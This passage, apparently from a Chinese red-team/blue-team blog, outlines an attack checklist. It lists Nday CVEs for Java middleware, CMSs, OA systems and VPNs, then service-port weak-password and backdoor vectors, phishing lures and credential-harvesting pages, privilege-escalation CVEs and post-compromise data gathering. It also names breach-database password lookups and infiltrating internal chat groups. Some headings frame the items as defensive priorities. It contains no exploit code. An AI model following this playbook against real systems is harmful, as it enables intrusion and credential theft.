并顺手到各个社工库中去批量查询这些邮箱曾经是否泄露过密码 ]</span><br><span class="line">目标自己对外提供的各种 技术文档 / wiki 里泄露的各种账号密码及其它敏感信息</span><br><span class="line">目标微信小程序</span><br><span class="line">分析目标app Web请求</span><br><span class="line">借助js探针搜集目标内网信息</span><br><span class="line">想办法混入目标的各种 内部QQ群 / 微信群</span><br><span class="line">分析目标直接供应商 [尤其是技术外包]</span><br><span class="line">根据前面已搜集到的各类信息制作有针对性的弱口令字典</span><br><span class="line">目标所用 Waf 种类识别 与 绕过</span><br><span class="line">BypassWAF 文件上传 / 读取 / 下载</span><br><span class="line">   BypassWAF Sql注入</span><br><span class="line">   BypassWAF RCE</span><br><span class="line">   BypassWAF 各类Java Web中间件已知Nday漏洞利用</span><br><span class="line">   BypassWAF Webshell 免杀</span><br><span class="line"></span><br><span class="line">其它更多 , 待补充修正...</span><br></pre></td></tr></table></figure><h3 id="0x02-入口权限获取-外部防御重心-“重中之重”"><a href="#0x02-入口权限获取-外部防御重心-“重中之重”" class="headerlink" title="0x02 入口权限获取 [ 外部防御重心 ( “重中之重” ) ]"></a>0x02 入口权限获取 [ 外部防御重心 ( “重中之重” ) ]</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">此阶段,主要是针对各主流 &quot;中间件 + 开源程序 + Web服务组件&quot; 自身的各种已知Nday漏洞利用</span><br><span class="line">如下已按 &quot;实际攻击利用的难易程度&quot; 及 &quot;获取到的shell权限高低&quot; 为标准进行了详细排序,由于完全以实战利用为导向</span><br><span class="line">故,仅仅只挑选了一些相对会经常遇到的,且实战中确实能有效协助快速getshell 的 &quot;中间件&quot; , &quot;开源程序&quot; 及 &quot;web组件&quot;</span><br></pre></td></tr></table></figure><h4 id="针对各类Java中间件的各种已知Nday漏洞利用"><a href="#针对各类Java中间件的各种已知Nday漏洞利用" class="headerlink" title="针对各类Java中间件的各种已知Nday漏洞利用"></a>针对各类Java中间件的各种已知Nday漏洞利用</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">不同于其它脚本类web程序,Java的运行权限通常都比较高,甚至大部分都是直接用root/administrator/system权限在跑</span><br><span class="line">所以拿到的shell权限一般也非常高,通常都直接是服务器权限</span><br><span class="line">尤其是在各种红队场景中,入侵者一般也都会首选这些点,并以此为突破口来获取一个稳定的跳板机入口权限</span><br><span class="line">关于到底哪些行业特别爱用哪些中间件,这些也应该都是有事先分析梳理汇总好的</span><br></pre></td></tr></table></figure><ul><li><p>Struts2</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">Struts2-005</span><br><span class="line">Struts2-008</span><br><span class="line">Struts2-009</span><br><span class="line">Struts2-013</span><br><span class="line">Struts2-016(实际上,很多都老系统都漏补了这个洞,成功率较高)</span><br><span class="line">Struts2-019</span><br><span class="line">Struts2-020</span><br><span class="line">Struts2-devmode</span><br><span class="line">Struts2-032</span><br><span class="line">Struts2-033</span><br><span class="line">Struts2-037</span><br><span class="line">Struts2-045</span><br><span class="line">Struts2-046</span><br><span class="line">Struts2-048</span><br><span class="line">Struts2-052</span><br><span class="line">Struts2-053</span><br><span class="line">Struts2-057</span><br></pre></td></tr></table></figure></li><li><p>weblogic</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">CVE-2019-2725</span><br><span class="line">CVE-2019-2729</span><br><span class="line">CVE-2018-3191</span><br><span class="line">CVE-2018-2628</span><br><span class="line">CVE-2018-2893</span><br><span class="line">CVE-2018-2894</span><br><span class="line">CVE-2017-3506</span><br><span class="line">CVE-2017-10271</span><br><span class="line">CVE-2017-3248</span><br><span class="line">CVE-2016-0638</span><br><span class="line">CVE-2016-3510</span><br><span class="line">CVE-2015-4852</span><br><span class="line">CVE-2014-4210</span><br><span class="line"></span><br><span class="line">SSRF</span><br><span class="line">控制台弱口令,部署webshell</span><br></pre></td></tr></table></figure></li><li><p>Jboss</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">CVE-2015-7501</span><br><span class="line">CVE-2017-7504</span><br><span class="line">CVE-2017-12149</span><br><span class="line"></span><br><span class="line">未授权访问,部署webshell</span><br><span class="line">控制台弱口令,部署webshell</span><br></pre></td></tr></table></figure></li><li><p>wildfly [ jboss 7.x 改名为 wildfly ]</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">控制台弱口令,部署webshell</span><br></pre></td></tr></table></figure></li><li><p>Tomcat</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">CVE-2016-8735</span><br><span class="line">CVE-2017-12615 [ readonly 实际设为 true的情况较少,稍鸡肋 ]</span><br><span class="line">CVE-2020-1938 [ AJP协议漏洞, 直接把8009端口暴露在外网的不太多,稍鸡肋 ]</span><br><span class="line"></span><br><span class="line">控制台弱口令,部署webshelll [ 注: 7.x版本后,默认加了防爆机制 ]</span><br></pre></td></tr></table></figure></li><li><p>Jekins</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">CVE-2018-1999002 [任意文件读取]</span><br><span class="line"></span><br><span class="line">未授权访问,任意命令执行</span><br><span class="line">控制台弱口令,任意命令执行</span><br></pre></td></tr></table></figure></li><li><p>ElasticSearch</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">CVE-2014-3120 [专门针对老版本(无沙盒)RCE]</span><br><span class="line">CVE-2015-1427 [Groovy RCE]</span><br><span class="line">CVE-2015-3337 [任意文件读取]</span><br><span class="line"></span><br><span class="line">未授权访问,敏感信息泄露</span><br></pre></td></tr></table></figure></li><li><p>RabbitMQ</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">弱口令</span><br></pre></td></tr></table></figure></li><li><p>Glassfish</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">任意文件读取 [ 低版本 ]</span><br><span class="line">控制台弱口令,部署webshell</span><br></pre></td></tr></table></figure></li><li><p>IBM Websphere</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Java 反序列化</span><br><span class="line">控制台弱口令,部署webshell</span><br></pre></td></tr></table></figure></li><li><p>Axis2</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">任意文件读取</span><br><span class="line">目录遍历</span><br></pre></td></tr></table></figure></li><li><p>Apache ActiveMQ</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">未授权访问,5.12 之前的版本 fileserver存在 PUT任意写</span><br><span class="line">CVE-2015-5254</span><br></pre></td></tr></table></figure></li><li><p>Apache Solr</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">CVE-2017-12629</span><br><span class="line">CVE-2019-0193 [ Apache Solr 5.x - 8.2.0 ]</span><br></pre></td></tr></table></figure></li><li><p>Apache Zookeeper</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">未授权访问,敏感信息泄露</span><br></pre></td></tr></table></figure></li><li><p>Apache Shiro反序列化</p></li><li><p>fastjson &lt;&#x3D; 1.2.47 反序列化利用</p><h4 id="针对各类Windows-php集成环境-由于此类环境拿到的Webshell权限相对较高-所以-通常也是红队人员的首选突破口"><a href="#针对各类Windows-php集成环境-由于此类环境拿到的Webshell权限相对较高-所以-通常也是红队人员的首选突破口" class="headerlink" title="针对各类Windows php集成环境  [ 由于此类环境拿到的Webshell权限相对较高,所以,通常也是红队人员的首选突破口 ]"></a>针对各类Windows php集成环境  [ 由于此类环境拿到的Webshell权限相对较高,所以,通常也是红队人员的首选突破口 ]</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">AppServ</span><br><span class="line">Xampp</span><br><span class="line">宝塔</span><br><span class="line">PhpStudy</span><br><span class="line">......</span><br></pre></td></tr></table></figure></li></ul><h4 id="针对各类开源程序的-已知Nday漏洞利用"><a href="#针对各类开源程序的-已知Nday漏洞利用" class="headerlink" title="针对各类开源程序的 已知Nday漏洞利用"></a>针对各类开源程序的 已知Nday漏洞利用</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">Dedecms 后台弱口令,系列已知nday漏洞利用</span><br><span class="line">thinkphp 5.x 后台弱口令,系列已知nday漏洞利用</span><br><span class="line">phpcms 后台弱口令,系列已知nday漏洞利用</span><br><span class="line">ecshop 后台弱口令,系列已知nday漏洞利用</span><br><span class="line">Metinfo 后台弱口令,系列已知nday漏洞利用</span><br><span class="line">discuz 后台弱口令,系列已知nday漏洞利用</span><br><span class="line">帝国cms 后台弱口令,系列已知nday漏洞利用</span><br><span class="line">phpmyadmin 数据库弱口令,系列已知nday漏洞利用</span><br><span class="line">wordpress 后台弱口令,系列已知nday漏洞利用</span><br><span class="line">joomla 后台弱口令,系列已知nday漏洞利用</span><br><span class="line">drupal CVE-2018-7600 ,后台弱口令,系列已知nday漏洞利用</span><br><span class="line">......</span><br></pre></td></tr></table></figure><h4 id="针对其它各类Web组件的-已知Nday漏洞利用"><a href="#针对其它各类Web组件的-已知Nday漏洞利用" class="headerlink" title="针对其它各类Web组件的 已知Nday漏洞利用"></a>针对其它各类Web组件的 已知Nday漏洞利用</h4><ul><li><p>IIS 6.0 RCE</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">短文件漏洞</span><br><span class="line">PUT 任意写</span><br><span class="line">Webdav RCE CVE-2017-7269</span><br></pre></td></tr></table></figure></li><li><p>禅道项目管理系统</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">SQL注入</span><br><span class="line">文件读取</span><br><span class="line">远程执行</span><br></pre></td></tr></table></figure></li><li><p>通达OA</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">SQL注入</span><br><span class="line">任意上传</span><br></pre></td></tr></table></figure></li><li><p>Exchange</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">利用接口进行邮箱用户名枚举</span><br><span class="line">针对各个接口的弱口令爆破</span><br><span class="line">CVE-2020-0688 [ 利用前提是需要先得有任意一个邮箱用户权限 ]</span><br><span class="line">....</span><br></pre></td></tr></table></figure></li><li><p>Zimbra [ XXE + SSRF &#x3D;&gt; RCE ]</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">CVE-2013-7091</span><br><span class="line">CVE-2016-9924</span><br><span class="line">CVE-2019-9670</span><br></pre></td></tr></table></figure></li><li><p>Citrix</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">CVE-2019-19781</span><br></pre></td></tr></table></figure></li><li><p>Jumpserver</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">身份验证绕过</span><br></pre></td></tr></table></figure></li><li><p>Zabbix</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">CVE-2017-2824</span><br><span class="line">SQL注入 [ 2.0 老版本 ]</span><br><span class="line">控制台弱口令,敏感机器信息泄露</span><br></pre></td></tr></table></figure></li><li><p>Cacti</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">低版本 SQL注入</span><br><span class="line">控制台弱口令</span><br></pre></td></tr></table></figure></li><li><p>Nagios</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">CVE-2016-9565</span><br><span class="line">控制台弱口令</span><br></pre></td></tr></table></figure></li><li><p>Webmin RCE</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">CVE-2019-15107 </span><br></pre></td></tr></table></figure></li><li><p>PHPMailer</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">CVE-2016-10033</span><br></pre></td></tr></table></figure></li><li><p>泛微OA远程代码执行</p></li><li><p>金蝶OA SQL注入</p></li><li><p>Coremail 敏感文件泄露</p></li><li><p>UEditor 任意文件上传</p></li><li><p>OpenSSL心脏滴血抓明文账号密码  [ Heartbleed ]</p></li><li><p>破壳漏洞 [ Shellshock ] </p><h4 id="各种能快速getshell的常规基础Web漏洞利用-注-有些漏洞在不审代码的情况下其实是很难有效盲测到的"><a href="#各种能快速getshell的常规基础Web漏洞利用-注-有些漏洞在不审代码的情况下其实是很难有效盲测到的" class="headerlink" title="各种能快速getshell的常规基础Web漏洞利用 [ 注: 有些漏洞在不审代码的情况下其实是很难有效盲测到的 ]"></a>各种能快速getshell的常规基础Web漏洞利用 [ 注: 有些漏洞在不审代码的情况下其实是很难有效盲测到的 ]</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">后台弱口令</span><br><span class="line">SSRF</span><br><span class="line">sql注入</span><br><span class="line">越权</span><br><span class="line">命令 / 代码执行 / 反序列化</span><br><span class="line">任意文件上传 / 下载 / 读取</span><br><span class="line">包含</span><br><span class="line">XSS（实际上,XSS只有在针对某些特定邮箱,手里有浏览器0day时价值才会比较大,红队场景下其实并不是非常致命)</span><br><span class="line">业务逻辑漏洞</span><br></pre></td></tr></table></figure></li></ul><h4 id="针对各类边界网络设备的各种利用-主要是Web管理控制台登录弱口令-及-各类已知nday攻击利用"><a href="#针对各类边界网络设备的各种利用-主要是Web管理控制台登录弱口令-及-各类已知nday攻击利用" class="headerlink" title="针对各类边界网络设备的各种利用,主要是Web管理控制台登录弱口令 及 各类已知nday攻击利用"></a>针对各类边界网络设备的各种利用,主要是Web管理控制台登录弱口令 及 各类已知nday攻击利用</h4><ul><li>Pulse Secure VPN<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">CVE-2019-11510 [ 任意文件读取 ]</span><br></pre></td></tr></table></figure></li><li>Fortinet VPN<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">CVE-2018-13379 [ 文件读取 ]</span><br></pre></td></tr></table></figure></li><li>Sangfor Vpn RCE</li></ul><h3 id="0x03-入口权限获取-专门针对各类基础服务端口的各种getshell利用，防御重点-“重中之重”"><a href="#0x03-入口权限获取-专门针对各类基础服务端口的各种getshell利用，防御重点-“重中之重”" class="headerlink" title="0x03 入口权限获取 [ 专门针对各类基础服务端口的各种getshell利用，防御重点 ( “重中之重” ) ]"></a>0x03 入口权限获取 [ 专门针对各类基础服务端口的各种getshell利用，防御重点 ( “重中之重” ) ]</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">此处仅仅只挑选了一些实战中真正能协助快速getshell的服务,其它的一些相对边缘性的服务均未提及 </span><br><span class="line">同样,已按 &quot;实际攻击利用的难易程度&quot; 及 &quot;获取到的shell权限高低&quot; 为标准进行了详细排序</span><br><span class="line">如下,就每个端口的具体攻击利用方式,进行了简要说明</span><br></pre></td></tr></table></figure><ul><li>Top Port List<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">Mssql   [ 默认工作在tcp 1433端口, 弱口令, 敏感账号密码泄露, 提权, 远程执行, 后门植入 ]</span><br><span class="line">SMB       [ 默认工作在tcp 445端口, 弱口令, 远程执行, 后门植入 ]</span><br><span class="line">WMI       [ 默认工作在tcp 135端口, 弱口令, 远程执行, 后门植入 ]</span><br><span class="line">WinRM  [ 默认工作在tcp 5985端口, 此项主要针对某些高版本Windows, 弱口令, 远程执行, 后门植入 ]</span><br><span class="line">RDP       [ 默认工作在tcp 3389端口, 弱口令, 远程执行, 别人留的shift类后门 ]</span><br><span class="line">SSH       [ 默认工作在tcp 22端口, 弱口令, 远程执行, 后门植入 ]</span><br><span class="line">ORACLE    [ 默认工作在tcp 1521端口, 弱口令, 敏感账号密码泄露, 提权, 远程执行, 后门植入 ]</span><br><span class="line">Mysql     [ 默认工作在tcp 3306端口, 弱口令, 敏感账号密码泄露, 提权(只适用于部分老系统) ]</span><br><span class="line">REDIS  [ 默认工作在tcp 6379端口, 弱口令, 未授权访问, 写文件(webshell,启动项,计划任务), 提权 ]</span><br><span class="line">POSTGRESQL[ 默认工作在tcp 5432端口, 弱口令, 敏感信息泄露 ]</span><br><span class="line">LDAP      [ 默认工作在tcp 389端口, 未授权访问, 弱口令, 敏感账号密码泄露 ]</span><br><span class="line">SMTP      [ 默认工作在tcp 25端口, 服务错误配置导致的用户名枚举漏洞, 弱口令, 敏感信息泄露 ]</span><br><span class="line">POP3      [ 默认工作在tcp 110端口, 弱口令, 敏感信息泄露 ]</span><br><span class="line">IMAP      [ 默认工作在tcp 143端口, 弱口令, 敏感信息泄露 ]</span><br><span class="line">Exchange  [ 默认工作在tcp 443端口, 接口弱口令爆破 eg: Owa,ews,oab,AutoDiscover... pth脱邮件, 敏感信息泄露 ... ]</span><br><span class="line">VNC       [ 默认工作在tcp 5900端口, 弱口令 ]</span><br><span class="line">FTP       [ 默认工作在tcp 21端口, 弱口令, 匿名访问/可写, 敏感信息泄露 ]</span><br><span class="line">Rsync     [ 默认工作在tcp 873端口, 未授权, 弱口令, 敏感信息泄露 ]</span><br><span class="line">Mongodb   [ 默认工作在tcp 27017端口, 未授权, 弱口令 ]</span><br><span class="line">TELNET    [ 默认工作在tcp 23端口, 弱口令, 后门植入 ]</span><br><span class="line">SVN       [ 默认工作在tcp 3690端口, 弱口令, 敏感信息泄露 ]</span><br><span class="line">JAVA RMI  [ 默认工作在tcp 1099端口, 可能存在反序列化利用 ]</span><br><span class="line">CouchDB   [ 默认工作在tcp 5984端口, 未授权访问 ]</span><br></pre></td></tr></table></figure></li></ul><h3 id="0x04-入口权限获取"><a href="#0x04-入口权限获取" class="headerlink" title="0x04 入口权限获取"></a>0x04 入口权限获取</h3><h4 id="传统钓鱼攻击利用，实际护网场景中用的非常频繁，细节非常多，此处不一一列举，防御重点"><a href="#传统钓鱼攻击利用，实际护网场景中用的非常频繁，细节非常多，此处不一一列举，防御重点" class="headerlink" title="传统钓鱼攻击利用，实际护网场景中用的非常频繁，细节非常多，此处不一一列举，防御重点"></a>传统钓鱼攻击利用，实际护网场景中用的非常频繁，细节非常多，此处不一一列举，防御重点</h4><ul><li><p>发信前期准备</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">枚举有效的目标邮箱用户名列表</span><br><span class="line">批量探测目标邮箱弱口令</span><br><span class="line">伪造发信人 [ 发信邮服搭建 ]</span><br><span class="line">钓鱼信 [ 针对不同行业一般也都会事先准备好各种各样的针对性的发信话术模板,以此来提到实际发信成功率 ]</span><br><span class="line">......</span><br></pre></td></tr></table></figure></li><li><p>典型投递方式 </p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">第一种,直接给目标发送各种常规木马信 </span><br><span class="line"></span><br><span class="line">传统宏利用</span><br><span class="line">捆绑</span><br><span class="line">exe[zip,7z]</span><br><span class="line">lnk</span><br><span class="line">chm</span><br><span class="line">自解压</span><br><span class="line">木马链接</span><br><span class="line">OLE</span><br><span class="line">CVE-2017-11882 [ 利用漏洞触发 ]</span><br><span class="line">...</span><br></pre></td></tr></table></figure></li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">第二种,给目标发送各种钓鱼链接,比如, 利用各种目标登录口的钓鱼页面来窃取各种内网账号密码 </span><br><span class="line"></span><br><span class="line">Vpn</span><br><span class="line">Mail</span><br><span class="line">OA</span><br><span class="line">Net ntlm hash [ 远程模板注入,pdf...钓hash,国内ISP过滤SMB流量不适用 ]</span><br><span class="line">......</span><br></pre></td></tr></table></figure><h3 id="0x05-主机安全-提权利用，防御重点"><a href="#0x05-主机安全-提权利用，防御重点" class="headerlink" title="0x05 主机安全 [ 提权利用，防御重点 ]"></a>0x05 主机安全 [ 提权利用，防御重点 ]</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">以下只单独挑了一些在 通用性, 稳定性, 易用性, 实际成功率 都相对较好的洞 和 方式 其它的一些&quot;边缘性&quot;的利用都暂未提及</span><br></pre></td></tr></table></figure><ul><li>Windows 系统漏洞 本地提权 [ 成功的前提是,保证事先已做好各种针对性免杀 ]<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">BypassUAC [ win7 / 8  / 8.1 / 10 ]</span><br><span class="line">MS14-058[KB3000061]    [重点]</span><br><span class="line">MS14-068[KB3011780]    [重点]</span><br><span class="line">ms15-051[KB3045171]    [重点]</span><br><span class="line">MS15-077[KB3077657]    [重点]</span><br><span class="line">MS16-032[KB3124280]    [重点]</span><br><span class="line">ms16-075    [重点]</span><br><span class="line">MS16-135[KB3199135]    [重点]</span><br><span class="line">MS17-010[KB4013389]    [重点]</span><br><span class="line">cve-2019-0708    [重点]</span><br><span class="line">CVE-2019-0803    [重点]</span><br><span class="line">CVE-2019-1322 &amp; CVE-2019-1405    [重点]</span><br><span class="line">cve-2019-12750 [ 赛门铁克(用的较多)本地提权 ]    [重点]</span><br></pre></td></tr></table></figure></li><li>linux 内核漏洞 本地提权 [ linux-exploit-suggester ]<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">CVE-2016-5195    [重点]</span><br><span class="line">CVE-2017-16995</span><br><span class="line">CVE-2019-13272</span><br></pre></td></tr></table></figure></li><li>利用各类第三方服务 &#x2F; 软件工具提权<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">Mssql     [重点]</span><br><span class="line">Oracle             [重点]</span><br><span class="line">Mysql</span><br><span class="line">各类第三方软件dll劫持     [重点]</span><br><span class="line">suid权限                        </span><br><span class="line">计划任务</span><br><span class="line">各种错误服务配置利用</span><br></pre></td></tr></table></figure></li></ul><h3 id="0x06-内网安全-敏感信息搜集，防御重点，可在此项严格限制各种系统内置命令执行"><a href="#0x06-内网安全-敏感信息搜集，防御重点，可在此项严格限制各种系统内置命令执行" class="headerlink" title="0x06 内网安全 [ 敏感信息搜集，防御重点，可在此项严格限制各种系统内置命令执行 ]"></a>0x06 内网安全 [ 敏感信息搜集，防御重点，可在此项严格限制各种系统内置命令执行 ]</h3><ul><li><p>搜集当前已控”跳板机”的各类敏感信息</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">注: 如下某些操作肯定是需要事先自己想办法先拿到管理权限后才能正常进行的,此处不再赘述</span><br><span class="line"></span><br><span class="line">查看当前shell权限 及 详细系统内核版本</span><br><span class="line">获取当前系统的 详细ip配置,包括 所在域, ip, 掩码, 网关, 主备 dns ip</span><br><span class="line">获取当前系统最近的用户登录记录</span><br><span class="line">获取当前用户的所有命令历史记录 [ 主要针对linux,里面可能包含的有各类敏感账号密码,ip,敏感服务配置... ]</span><br><span class="line">获取本机所有 服务/进程 [包括各个进程的详细权限,也包括目标系统中的可疑恶意进程(有可能是同行的马)]/端口/网络连接信息</span><br><span class="line">获取本机所用杀软 / 监控种类 [ 后续好针对性的做免杀 ]</span><br><span class="line">获取本机 rdp / ssh 端口开启状态 及 其默认端口号</span><br><span class="line">获取本机所有用户的rdp外连记录</span><br><span class="line">获取本机的所有SSH登录记录</span><br><span class="line">获取当前系统所有登录成功的日志 [ 针对windows ]</span><br><span class="line">获取本机所有已安装软件的详细列表 [ 主要为抓密码,提权,留后门做准备 ]</span><br><span class="line">获取本机各个浏览器中保存的 所有书签页 及 历史浏览记录</span><br><span class="line">获取当前用户创建的所有计划任务列表 及 计划任务所对应的执行脚本内容 [ 有些执行脚本中很可能存的有各种连接账号密码 ]</span><br><span class="line">获取当前用户 桌面 及 回收站 里的所有文件列表</span><br><span class="line">获取当前系统的所有存在suid权限的二进制程序</span><br><span class="line">获取当前系统代理 [ ip &amp; 端口 ]</span><br><span class="line">获取当前系统所有的自启动注册表项值</span><br><span class="line">获取当前系统的所有 ipc 连接 及 已启用共享</span><br><span class="line">获取当前系统的所有挂载[mount]</span><br><span class="line">获取当前系统的防火墙状态</span><br><span class="line">获取当前系统所有分区/盘符及其详细使用情况</span><br><span 